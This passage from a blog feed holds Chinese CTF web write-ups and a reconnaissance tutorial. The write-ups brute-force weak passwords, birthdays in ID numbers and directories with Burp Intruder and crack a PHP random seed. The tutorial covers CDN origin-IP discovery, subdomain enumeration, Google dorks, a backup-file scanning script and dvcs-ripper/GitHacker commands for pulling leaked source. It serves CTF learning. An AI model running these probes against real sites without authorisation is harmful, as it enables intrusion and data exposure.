src="/posts/3dacd76b5d9a/image-20230908135729787.png" class="" title="image-20230908135729787"><p>得到随机数1为$100+1931798008=1931798108$</p><p>使用burp抓包发现php版本为7.1以上</p><img src="/posts/3dacd76b5d9a/image-20230908142742187.png" class="" title="image-20230908142742187"><p>丢入php_mt_seed工具中爆破，得到seed可能为110936901、327092611和2027529594</p><img src="/posts/3dacd76b5d9a/image-20230908145409908.png" class="" title="image-20230908145409908"><p>测试第一个种子，在本地生成三个随机数</p><img src="/posts/3dacd76b5d9a/image-20230908144943558.png" class="" title="image-20230908144943558"><p>得到cookie值$1571155150+1115554962=2686710112$，使用burp传入r和token，得到flag</p><img src="/posts/3dacd76b5d9a/image-20230908145030684.png" class="" title="image-20230908145030684"><h3 id="web26（弱口令密码爆破）"><a href="#web26（弱口令密码爆破）" class="headerlink" title="web26（弱口令密码爆破）"></a>web26（弱口令密码爆破）</h3><p>观察界面，这一题依然是爆破用户名和密码</p><img src="/posts/3dacd76b5d9a/image-20230908145925565.png" class="" title="image-20230908145925565"><p>既然用户名里已经提示管理员账号为root，那我们只需要爆破密码即可</p><p>使用Intruder的狙击手模式</p><img src="/posts/3dacd76b5d9a/image-20230908150559112.png" class="" title="image-20230908150559112"><p>在网上随便找一份弱密码字典开始爆破</p><img src="/posts/3dacd76b5d9a/image-20230908152352326.png" class="" title="image-20230908152352326"><p>非常幸运地爆破出密码</p><img src="/posts/3dacd76b5d9a/image-20230908153446275.png" class="" title="image-20230908153446275"><div class="note primary flat"><p>这题也提醒我们平常要备一些弱口令密码字典</p></div><h3 id="web27（生日爆破）"><a href="#web27（生日爆破）" class="headerlink" title="web27（生日爆破）"></a>web27（生日爆破）</h3><p>进入题目站点的主页面</p><img src="/posts/3dacd76b5d9a/image-20230908154400443.png" class="" title="image-20230908154400443"><p>点击学生学籍信息查询系统会跳转到如下界面，猜测是用来查询账号密码的</p><img src="/posts/3dacd76b5d9a/image-20230908154641017.png" class="" title="image-20230908154641017"><p>点击录取名单会下载如下表格</p><img src="/posts/3dacd76b5d9a/image-20230908154442044.png" class="" title="image-20230908154442044"><p>可以看到身份证号码的生日一栏刚好被遮住，所以需要我们爆破生日</p><p>随便选择一个学生，在学生学籍信息查询系统中进行爆破</p><img src="/posts/3dacd76b5d9a/image-20230908160305835.png" class="" title="image-20230908160305835"><p>使用Dates形式的Payload，从1990年爆破到2005年的日期，并且使用身份证中生日的格式</p><img src="/posts/3dacd76b5d9a/image-20230908163432277.png" class="" title="image-20230908163432277"><p>找到响应报文最长的一条，得到登录信息</p><img src="/posts/3dacd76b5d9a/image-20230908164525925.png" class="" title="image-20230908164525925"><p>将信息unicode解码</p><img src="/posts/3dacd76b5d9a/image-20230908165007265.png" class="" title="image-20230908165007265"><p>登录系统后得到flag</p><img src="/posts/3dacd76b5d9a/image-20230908165353748.png" class="" title="image-20230908165353748"><h3 id="web28（目录爆破）"><a href="#web28（目录爆破）" class="headerlink" title="web28（目录爆破）"></a>web28（目录爆破）</h3><p>观察目标站点的目录，非常具有特点，均为数字</p><img src="/posts/3dacd76b5d9a/image-20230908170057440.png" class="" title="image-20230908170057440"><p>由于是简单的数字组成的目录，尝试用burp爆破目录</p><p>使用集束炸弹模式，且目录层数与默认页面一致</p><img src="/posts/3dacd76b5d9a/image-20230908170856045.png" class="" title="image-20230908170856045"><p>两层目录的payload均使用数字模式，从1遍历到100</p><img src="/posts/3dacd76b5d9a/image-20230908171016935.png" class="" title="image-20230908171016935"><p>爆破得到flag</p><img src="/posts/3dacd76b5d9a/image-20230908171357971.png" class="" title="image-20230908171357971">]]></content>
      
      
      <categories>
          
          <category> CTF Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> Web </tag>
            
            <tag> 软件工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF Web信息搜集</title>
      <link href="/posts/24259a52c7ee/"/>
      <url>/posts/24259a52c7ee/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这段时间开始入门Web，主要是<strong>为了在线下赛不那么坐牢</strong></p><p>Web的知识还是挺多的，所以需要成体系的学习</p><p>每学完一个方面我会写一篇总结性文章，将知识点与例题放在一起，方便后面查阅</p><p>如果之后学的更加深入或者遇到什么有代表性的题目，也会添加到文章中</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>渗透的本质是信息收集，信息收集也叫做资产收集。</p><p>信息收集是渗透测试的前期主要工作，是非常重要的环节，收集足够多的信息才能方便接下来的测试，信息收集主要是收集网站的域名信息、子域名信息、目标网站信息、目标网站真实IP、敏感/目录文件、开放端口和中间件信息等等。通过各种渠道和手段尽可能收集到多的关于这个站点的信息，有助于我们更多的去找到渗透点，突破口。</p><h3 id="常见信息"><a href="#常见信息" class="headerlink" title="常见信息"></a>常见信息</h3><div class="table-container"><table><thead><tr><th>搜集方面</th><th>作用</th></tr></thead><tbody><tr><td>whois</td><td>得到域名注册人的信息:邮箱、电话号码、姓名</td></tr><tr><td>子域名</td><td>可以扩大攻击范围，子域名一定是有关联的，很多时候基本上都同属一个公司</td></tr><tr><td>端口探测</td><td>危险端口可以直接爆破入侵，一个Ip可能搭建了多个网站，分布在不同的端口</td></tr><tr><td>目录扫描</td><td>目录扫描有的时候可以访问到压缩包源码、编辑器目录、废弃页面、其他站点</td></tr><tr><td>指纹识别</td><td>识别CMS，寻找通杀漏洞</td></tr><tr><td>旁站查询</td><td>旁站其实就是同IP站点，一定和目标站点在同一个内网或者是同一台服务器</td></tr><tr><td>C段查询</td><td>C段可能是同一个内网，同一个公司</td></tr><tr><td>内容敏感信息泄露</td><td>通过谷歌语法得到其他的东西</td></tr></tbody></table></div><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h4><h5 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h5><p><strong>概述</strong></p><div class="note info flat"><p><strong>whois</strong>（读作“Who is”，非缩写）是用来查询域名的IP以及所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）</p></div><p><strong>收集方法</strong></p><ul><li><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></li><li><a href="https://www.whois.com/">https://www.whois.com/</a></li><li><a href="https://www.virustotal.com/gui/home/url">VirusTotal - Home</a></li></ul><h5 id="备案"><a href="#备案" class="headerlink" title="备案"></a>备案</h5><p><strong>概述</strong></p><p>网站备案也算是中国互联网的一大特色了</p><div class="note info flat"><p><strong>非经营性网站备案</strong>（Internet Content Provider Registration Record），简称<strong>ICP备案</strong>，指中华人民共和国境内信息服务互联网站所需进行的备案登记作业。</p></div><p>如果某网站申请了ICP备案，那么就能通过查询备案可以获取备案人的大量信息</p><p><strong>收集方法</strong></p><ul><li><a href="https://www.beianx.cn/">ICP备案查询网 - 网站备案查询 - 工信部域名备案查询实时数据 (beianx.cn)</a></li><li><a href="https://beian.tianyancha.com/">ICP备案查询<em>备案号查询</em>网站备案查询 - 天眼查 (tianyancha.com)</a></li></ul><p><strong>注意事项</strong></p><p>一些个人网站底部贴的备案号很有可能是假的，或从其他站点复制过来的。所以查询备案信息时尽量通过域名来直接查询。</p><h5 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h5><p><strong>概述</strong></p><div class="note info flat"><p><strong>內容分发网络</strong>（英语：<strong>C</strong>ontent <strong>D</strong>elivery <strong>N</strong>etwork或<strong>C</strong>ontent <strong>D</strong>istribution <strong>N</strong>etwork，缩写：<strong>CDN</strong>）是指一种透过互联网互相连接的电脑网络系统，利用最靠近每位用户的服务器，更快、更可靠地将音乐、图片、视频、应用程序及其他文件发送给用户，来提供高性能、可扩展性及低成本的网络内容传递给用户。</p></div><p>正好在我的博客R1ck’s Portal中，也使用到了这种内容分发网络服务，所以对它的作用的体会非常深刻。</p><p>在很大程度上，CDN能抵御像DDOS之类的攻击，同时还能让站点的真实IP “隐身”</p><p>但是这对于我们渗透测试时影响很大：无论我们对CDN的服务器有多大的控制权，也始终影响不到真实站点，也就是源站</p><p>此时需要我们<strong>绕过CDN</strong>，找到真正源站的IP</p><p><strong>绕过方法</strong></p><ol><li><p>查询历史DNS记录</p><ul><li><a href="https://viewdns.info/iphistory/">IP History - ViewDNS.info</a></li><li><a href="https://www.dnsdb.io/zh-cn/">DNSDB</a></li></ul></li><li><p>PHPinfo</p><p>如果目标网站存在phpinfo泄露等，可以在phpinfo中的<strong>SERVER_ADDR</strong>或<strong>_SERVER[“SERVER_ADDR”]</strong>找到真实ip</p></li><li><p>查询子域名</p><p>CDN的流量费还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。</p><p>具体查询子域名的方法会在接下来介绍</p></li><li><p>使用国外主机解析域名</p><p>国内很多 CDN 厂商因为各种原因只做了国内的线路，而没有针对国外的线路，此时我们使用国外的主机直接访问可能就能获取到真实IP。</p></li><li><p>网站邮件订阅查找</p><p>RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。</p></li></ol><h5 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h5><p><strong>概述</strong></p><p>收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。</p><p><strong>收集方法</strong></p><ol><li><p>使用搜索引擎在线收集</p><ul><li><p>FOFA搜索子域名</p><p><a href="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a></p><p>语法：domain=”主域名”</p></li><li><p>使用谷歌语法</p><p>Site:主域名</p></li></ul></li><li><p>在线查询</p><ul><li><a href="https://chaziyu.com/">子域名查询 查子域名 查子站 子域名大全 二级域名查询 查子域 (chaziyu.com)</a></li><li><a href="https://dnsdumpster.com/">DNSdumpster.com - dns recon and research, find and lookup dns records</a></li><li><a href="http://tool.chinaz.com/subdomain/">http://tool.chinaz.com/subdomain/</a></li></ul></li><li><p>使用工具爆破挖掘子域名</p><ul><li><p>Layer</p><p>链接：<a href="https://pan.baidu.com/s/1QEYXjrGsARcXk6D-xLS64Q?pwd=1111">https://pan.baidu.com/s/1QEYXjrGsARcXk6D-xLS64Q?pwd=1111</a><br>提取码：1111 </p></li><li><p>OneForAll</p><p><a href="https://github.com/shmilylty/OneForAll">shmilylty/OneForAll: OneForAll是一款功能强大的子域收集工具 (github.com)</a></p><div class="note info flat"><p>使用OneForAll时需要以管理员身份打开终端</p></div><div class="note primary flat"><p>使用高版本python运行时可能会出现报错<code>ImportError: cannot import name ‘sre_parse’ from ‘re’</code></p><p>解决方法是找到python文件下的Lib\site-packages\exrex.py文件，对其代码进行更改：</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230822210252449.png" alt="image-20230822210252449"></p></div></li></ul></li><li><p>使用证书反查</p><p><a href="https://crt.sh/">crt.sh | Certificate Search</a></p></li></ol><h5 id="解析记录"><a href="#解析记录" class="headerlink" title="解析记录"></a>解析记录</h5><p><strong>概述</strong></p><p>查询域名的NS记录、MX记录、TXT记录等很有可能指向的是真实ip或同C段服务器。</p><p>同时flag也有可能藏在这些解析记录中</p><p><strong>常见解析类型</strong></p><ol><li>A记录（Address Record）：A记录将域名解析为IPv4地址。这是最常见的DNS记录类型，用于将主机名（例如：<a href="http://example.com）指向一个IPv4地址（例如：192.0.2.1）。">http://example.com）指向一个IPv4地址（例如：192.0.2.1）。</a></li><li>AAAA记录（IPv6 Address Record）：AAAA记录将域名解析为IPv6地址。与A记录类似，AAAA记录用于将主机名（例如：<a href="http://example.com）指向一个IPv6地址（例如：2001:0db8:85a3:0000:0000:8a2e:0370:7334）。">http://example.com）指向一个IPv6地址（例如：2001:0db8:85a3:0000:0000:8a2e:0370:7334）。</a></li><li>CNAME记录（Canonical Name Record）：CNAME记录用于将一个域名指向另一个域名。通常用于别名或子域名的情况，例如将<a href="http://www.example.com指向http://example.com。">http://www.example.com指向http://example.com。</a></li><li>MX记录（Mail Exchange Record）：MX记录用于指定处理域名电子邮件的邮件服务器。通常，MX记录会指向一个邮件服务器的域名，如：<a href="http://mail.example.com。">http://mail.example.com。</a></li><li>NS记录（Name Server Record）：NS记录指定了负责解析域名的DNS服务器。通常，在注册域名时，域名注册商会为您分配默认的NS记录。这些记录可以更改，以便将域名的解析委托给其他DNS服务器。</li><li>TXT记录（Text Record）：TXT记录用于存储与域名相关的任意文本信息。这些记录通常用于验证域名所有权（如Google网站验证）或实现电子邮件验证技术（如SPF，DKIM和DMARC）。</li></ol><p><strong>收集方法</strong></p><ol><li><p>使用本机的nslookup命令</p><p><code>nslookup -type=type domain [dns-server]</code></p><p>其中type为解析类型，domain为域名，dns服务器为可选项</p><p>命令详解：<a href="https://blog.csdn.net/glmichelin/article/details/113186020">nslookup命令详解和实战例子（全）_老鸟诗人的博客-CSDN博客</a></p></li><li><p>在线查询</p><ul><li><a href="http://www.jsons.cn/nslookup/">在线域名解析记录检测-在线Nslookup域名解析查询工具 (jsons.cn)</a></li><li><a href="https://ipw.cn/dns/">域名解析查询 | DNS查询 | IPv6解析 | 在线dig | IP查询(ipw.cn)</a></li></ul></li></ol><h4 id="旁站"><a href="#旁站" class="headerlink" title="旁站"></a>旁站</h4><p><strong>概述</strong></p><p>旁站指的是同一服务器上的其他网站，一般是同一ip</p><p><strong>收集方法</strong></p><ol><li><p>在线查询</p><ul><li><p><a href="https://stool.chinaz.com/same">同IP网站查询，同服务器网站查询 - 站长工具 (chinaz.com)</a></p></li><li><p><a href="https://ipchaxun.com/">ip查询 查ip 网站ip查询 同ip网站查询 iP反查域名 iP查域名 同ip域名 (ipchaxun.com)</a></p></li></ul></li><li><p>搜索引擎</p><p>fofa</p><p>语法：ip=”xxx.xxx.xxx.xxx”</p></li></ol><h4 id="C段"><a href="#C段" class="headerlink" title="C段"></a>C段</h4><p><strong>概述</strong></p><p>对目标主机无计可施时，我们可以尝试一下从C段入手。C段入侵是拿下同一C段下的服务器，也就是说是D段1-255中的一台服务器，然后直接从被端掉的服务器出发进行其他测试</p><p><strong>收集方法</strong></p><ol><li><p>在线查询</p><p><a href="https://www.webscan.cc/">同IP网站查询,C段查询,IP反查域名,在线C段,旁站工具 - WebScan</a></p></li><li><p>搜索引擎</p><p>fofa</p><p>语法:ip=”xxx.xxx.xxx.0/24”</p></li></ol><h4 id="服务器信息"><a href="#服务器信息" class="headerlink" title="服务器信息"></a>服务器信息</h4><h5 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h5><p><strong>概述</strong></p><p>当确定了目标大概的ip段后，可以先对ip的开放端口进行探测，一些特定服务可能开起在默认端口上，探测开放端口有利于快速收集目标资产，找到目标网站的其他功能站点。通过扫描服务器开放的端口以及从该端口判断服务器上存在的服务。</p><p><strong>收集方法</strong></p><ol><li><p>在线端口检测</p><ul><li><a href="https://tool.chinaz.com/port/">端口扫描 - 站长工具 (chinaz.com)</a></li><li><a href="http://coolaf.com/tool/port">在线端口检测,端口扫描,端口开放检查-在线工具-postjson (coolaf.com)</a></li></ul></li><li><p>扫描工具</p><ul><li><p>御剑</p></li><li><p>Nmap</p><p>教程：<a href="https://blog.csdn.net/weixin_54977781/article/details/123852687">https://blog.csdn.net/weixin_54977781/article/details/123852687</a></p></li></ul></li></ol><h5 id="服务器类型"><a href="#服务器类型" class="headerlink" title="服务器类型"></a>服务器类型</h5><p>网站服务器有不同的操作系统：windows、Linux、mac os</p><p>windows对大小写不敏感，其他两个对大小写敏感</p><h5 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h5><p>目前比较常用的数据库有:MySQL、SQL server、Oracle等。SQL server开放的默认端口：1433，MySQL开放的默认端口：3306、Oracle开放的默认端口：1521。</p><h5 id="waf防火墙"><a href="#waf防火墙" class="headerlink" title="waf防火墙"></a>waf防火墙</h5><p><strong>收集方法</strong></p><p>kali自带Wafw00f</p><p>语法：wafw00f xxx.com</p><h4 id="网站信息"><a href="#网站信息" class="headerlink" title="网站信息"></a>网站信息</h4><h5 id="备份文件"><a href="#备份文件" class="headerlink" title="备份文件"></a>备份文件</h5><p>除了F12查看源代码，有时网站的备份文件也会泄漏源代码</p><p>备份文件是常见的源码泄露的方式，实践中往往是开发者的疏忽而忘记删除备份文件，从而导致服务器中残留源码。我们可以通过访问这些备份文件来审计代码，一般情况下可以用后台扫描工具扫描。</p><h6 id="备份文件常见的后缀名"><a href="#备份文件常见的后缀名" class="headerlink" title="备份文件常见的后缀名"></a>备份文件常见的后缀名</h6><p>备份文件基本上都是压缩包</p><p>.rar .zip .7z .tar .gz .bak<br>对于bak类的备份文件，可以直接输入文件名称+.bak访问例如：<br><code>index.php.bak</code><br>.txt .old .temp _index.html .swp .sql .tgz</p><h6 id="备份文件常见的文件名"><a href="#备份文件常见的文件名" class="headerlink" title="备份文件常见的文件名"></a>备份文件常见的文件名</h6><p>web<br>website<br>backup<br>back<br>www<br>wwwroot<br>temp<br>db<br>data<br>code<br>test<br>admin<br>user<br>sql</p><h6 id="gedit备份文件"><a href="#gedit备份文件" class="headerlink" title="gedit备份文件"></a>gedit备份文件</h6><div class="note info flat"><p>在Linux下，用gedit编辑器保存后，当前目录下会生成一个后缀为<code>~</code>的文件，其文件内容就是刚编辑的内容。假设刚才保存的文件名为flag，则该文件名为flag~。</p></div><p>通过浏览器访问这个带有<code>~</code>的文件，便能得到源代码</p><h6 id="vim备份文件"><a href="#vim备份文件" class="headerlink" title="vim备份文件"></a>vim备份文件</h6><div class="note info flat"><p>使用vim编辑器编写<code>filename</code>文件时，会有一个<code>.filename.swp</code>文件产生，它是隐藏文件。如果编写文件时正常退出，则该swp文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出时未能保存的文件，同时多次意外退出并不会覆盖旧的<code>.swp</code>文件，而是会生成一个新的，例如<code>.swo</code>文件。</p></div><p>针对swp备份文件，我们可以用<code>vim -r</code>命令恢复文件的内容</p><p>例如当前目录下假如存在<code>.flag.swp</code>文件，则恢复命令为<code>vim -r flag</code></p><h6 id="收集方法"><a href="#收集方法" class="headerlink" title="收集方法"></a>收集方法</h6><ol><li><p>手动组合文件名和后缀并尝试</p></li><li><p>使用后台扫描工具</p></li><li><p>使用BurpSuite</p><p>将访问目标站点的请求包转到<strong>Intruder模块</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824160319872.png" alt="image-20230824160319872"></p><p>使用<strong>集束炸弹模式</strong>，并设置两个变量</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824161726084.png" alt="image-20230824161726084"></p><p>设置payload为测试用的文件名和后缀</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824162745213.png" alt="image-20230824162745213"></p></li><li><p>使用自定义python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&#x27;http://example.com&#x27;</span><span class="comment"># url为被扫描地址，后不加‘/’</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见的网站源码备份文件名</span></span><br><span class="line">list1 = [<span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>,<span class="string">&#x27;data&#x27;</span>,<span class="string">&#x27;db&#x27;</span>,<span class="string">&#x27;code&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;index.php&#x27;</span>]</span><br><span class="line"><span class="comment"># 常见的网站源码备份文件后缀</span></span><br><span class="line">list2 = [<span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;tar.gz&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;rar&#x27;</span>, <span class="string">&#x27;bak&#x27;</span>,<span class="string">&#x27;old&#x27;</span> ,<span class="string">&#x27;temp&#x27;</span>,<span class="string">&#x27;_index.html&#x27;</span>,<span class="string">&#x27;.swp&#x27;</span>,<span class="string">&#x27;.sql&#x27;</span>,<span class="string">&#x27;.tgz&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">        back = <span class="built_in">str</span>(i) + <span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(j)</span><br><span class="line">        url = <span class="built_in">str</span>(url1) + <span class="string">&#x27;/&#x27;</span> + back</span><br><span class="line">        <span class="built_in">print</span>(back + <span class="string">&#x27;    &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(requests.get(url).status_code)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h5 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h5><p><strong>概述</strong></p><p>通过扫描目录和文件，大致了解同站的的结构，获取突破点，比如后台，文件备份，上传点以及源码的目录</p><p>敏感文件常见的如.git文件泄露，.svn文件泄露，phpinfo泄露等</p><p><strong>收集方法</strong></p><ol><li><p>后台扫描工具</p><ul><li><p>御剑</p><p>链接: <a href="https://pan.baidu.com/s/1uvnBpzTvp7GLhIoivnIN0w?pwd=1111">https://pan.baidu.com/s/1uvnBpzTvp7GLhIoivnIN0w?pwd=1111</a></p><p>提取码: 1111 </p><p>御剑工具的字典非常重要，平时做题遇到没见过的的后台都可以加进去</p></li><li><p>dirsearch</p><div class="note warning flat"><p>这里安装dersearch后可能会出现扫描慢的情况（正常扫描速度应该在200/s左右）</p><p>解决方法参考这篇文章：<a href="https://liangmaxwell.github.io/2023/03/26/dirsearch-sao-miao-su-du-man-de-bug-xiu-fu/">dirsearch扫描速度慢的bug修复 | LiangMaxwell’s Blog</a></p></div><p>语法：<code>python dirsearch.py -u http://example.com:10800</code></p><p>指定响应码可以加上<code>-i</code></p><p>例如若要指定200和300-399之间的响应码，可以加上<code>-i 200,300-399</code></p><p>递归目录扫描，可以加上<code>-r -R 层数</code></p><p>详细使用教程：<a href="https://blog.csdn.net/qq_43936524/article/details/115271837">dirsearch用法大全_kit_1的博客-CSDN博客</a></p></li></ul></li><li><p>查看robots.txt和sitemap.xml等文件</p></li><li><p>搜索引擎在线收集</p><ul><li>任意文件下载:<code>site:域名 filetype:zip|rar|zip|xml</code></li><li>敏感信息（目录）：<code>site:域名 index of、intitle:&quot;Index of /admin&quot;</code></li><li>未授权访问：<code>inurl:php? intext:CHARACTER_SETS,COLLATIONS, ?intitle:phpmyadmin</code></li><li>后台：<code>site:xxx.com inurl:login|admin|manage|member|admin_login|login_admin|system|login|user</code></li></ul></li></ol><h5 id="CMS类型（指纹识别）"><a href="#CMS类型（指纹识别）" class="headerlink" title="CMS类型（指纹识别）"></a>CMS类型（指纹识别）</h5><p><strong>概述</strong></p><p>收集好网站信息之后，应该对网站进行指纹识别，通过识别指纹，确定目标的cms及版本，方便制定下一步的测试计划</p><div class="note info flat"><p><strong>CMS</strong>是<strong>内容管理系统</strong>的缩写。它是一种软件工具，用于创建、编辑和发布内容。CMS系统可以帮助用户创建和管理他们的网站，帮助网站管理员管理构成现代网站的许多不同资源，内容类型和各种数据。CMS系统分为四种不同类型：企业内容管理系统（ECM / ECMS），Web内容管理系统，Web组内容管理系统和组件内容管理系统。CMS最擅长的就是建设网站，最流行的CMS有：Wordpress，Drupal，Joomla</p></div><p><strong>收集工具</strong></p><ol><li><p>在线识别工具</p><ul><li>云悉： <a href="https://www.yunsee.cn/">云悉互联网WEB资产在线梳理|在线CMS指纹识别平台 - 云悉安全平台 (yunsee.cn)</a></li><li>潮汐：<a href="http://finger.tidesec.com/">TideFinger 潮汐指纹 TideFinger 潮汐指纹 (tidesec.com)</a></li></ul></li><li><p>kali自带的whatweb</p><p>语法：whatweb xxx.com</p></li></ol><h5 id="探针泄漏"><a href="#探针泄漏" class="headerlink" title="探针泄漏"></a>探针泄漏</h5><p><strong>概述</strong></p><div class="note info flat"><p>安装了LNMP后或者是配置了PHP环境后，我们一般习惯性地上传一个<strong>PHP探针</strong>来检测一下我们的PHP环境是否正确地配置，同时有时遇到一些特殊的程序需要相关的PHP组件支持，我们也可以上传一个PHP探针来检测一下我们的Web环境是否符合要求。</p></div><p><strong>收集方法</strong></p><ol><li><p>尝试手动添加常见的探针文件</p><p>常见探针文件有：</p><p>phpinfo.php</p><p>tz.php</p><p>monitor.php</p><p>l.php</p></li><li><p>在后台扫描字典中添加常见探针文件</p></li></ol><h4 id="谷歌hacker"><a href="#谷歌hacker" class="headerlink" title="谷歌hacker"></a>谷歌hacker</h4><p><strong>谷歌语法</strong></p><ul><li><p>site:</p><ul><li>指定域名</li></ul></li><li><p>filetype:</p><ul><li>指定文件类型</li></ul></li><li><p>inurl:</p><ul><li>指定URL</li></ul></li><li><p>link:</p><ul><li>包含指定网页的链接的网页</li></ul></li><li><p>intitle:</p><ul><li>指定title</li></ul></li><li><p>intext:</p><ul><li>指定内容</li></ul></li></ul><p><strong>详细教程</strong></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/84029809">信息收集之Google Hacking的简单用法<em>index of /admin</em>谢公子的博客-CSDN博客</a></p><h4 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h4><h5 id="git-源码泄露"><a href="#git-源码泄露" class="headerlink" title="git 源码泄露"></a>git 源码泄露</h5><div class="note info flat"><p><strong>git</strong>是一个主流的分布式版本控制系统，开发人员在开发过程中经常会遗忘<code>.git</code>文件夹，导致攻击者可以通过<code>.git</code>文件夹中的信息获取开发人员提交过的所有源码，进而可能导致服务器被攻击而沦陷</p></div><ul><li><p><strong>常规git泄漏</strong></p><p>利用.get文件恢复源码</p><p>使用工具<strong>GitHacker</strong>：<a href="https://github.com/WangYihang/GitHacker/">WangYihang/GitHacker</a></p><p>语法：<code>githacker --url http://example.com/.git/ --output-folder G:\CTF\Web\工具\GitHacker\result</code></p><p>或者使用工具<strong>dvcs-rippper</strong></p><p><code>rip-git.pl -v -u http://www.example.com/.git/</code></p></li><li><p><strong>git回滚</strong></p><div class="note info flat"><p>git会记录每次提交(commit)的修改</p></div><p>git回滚可以让我们复原之前<strong>commit</strong>的版本</p><p><code>git log --stat</code>可以查看每个commit修改了哪些文件</p><p><code>git diff HEAD commit-id</code>可以查看当前版本与指定commit之间的区别</p><p>使用<code>git stash pop</code>恢复文件</p><p>使用命令<code>git reset HEAD^</code>可以回到上一个版本</p></li><li><p><strong>git分支</strong></p><p>git中常用的是master分支，但也可能存在其他的时间线分支</p><p>在恢复的源码文件夹中执行<code>git branch -v</code>查看分支信息</p><p>执行<code>git reflog</code>查看checkout记录</p><p>下载分支的head信息</p><p>再使用工具恢复</p></li></ul><h5 id="SVN-源码泄露"><a href="#SVN-源码泄露" class="headerlink" title="SVN 源码泄露"></a>SVN 源码泄露</h5><div class="note info flat"><p><strong>SVN</strong>是一个开放源代码的版本控制系统。在使用SVN管理本地代码过程中，会自动生成一个名为<code>.svn</code>的隐藏文件夹，其中包含重要的源代码信息。</p></div><p>主要利用<strong>.svn/entries</strong>及<strong>wc.db文件</strong></p><p>可以使用工具<strong>dvcs-ripper</strong></p><div class="note warning flat"><p>dvcs-ripper需要在linux系统使用</p></div><p><code>rip-svn.pl -v -u http://www.example.com/.svn/</code></p><h5 id="hg源码泄漏"><a href="#hg源码泄漏" class="headerlink" title="hg源码泄漏"></a>hg源码泄漏</h5><div class="note info flat"><p><strong>Mercurial</strong> 是一种轻量级分布式版本控制系统，使用 <code>hg init</code>的时候会生成.hg，其中包含代码和分支修改记录等信息。</p></div><p>可以使用工具<strong>dvcs-ripper</strong></p><p><code>rip-hg.pl -v -u http://www.example.com/.hg/</code></p><h5 id="CVS泄露"><a href="#CVS泄露" class="headerlink" title="CVS泄露"></a>CVS泄露</h5><div class="note info flat"><p><strong>CVS</strong>是一个C/S系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。</p></div><p>针对 CVS/Root以及CVS/Entries目录，直接就可以看到泄露的信息。</p><p>利用工具<strong>dvcs-ripper</strong></p><p><code>rip-cvs.pl -v -u http://www.example.com/CVS/</code></p><h5 id="Bazaar-bzr泄露"><a href="#Bazaar-bzr泄露" class="headerlink" title="Bazaar/bzr泄露"></a>Bazaar/bzr泄露</h5><div class="note info flat"><p><strong>bzr</strong>是个版本控制工具, 虽然不是很热门, 但它也是多平台支持, 并且有不错的图形界面。</p></div><p>使用工具<strong>dvcs-ripper</strong></p><p><code>rip-bzr.pl -v -u http://www.example.com/.bzr/</code></p><h5 id="DS-Store-文件泄露"><a href="#DS-Store-文件泄露" class="headerlink" title="DS_Store 文件泄露"></a>DS_Store 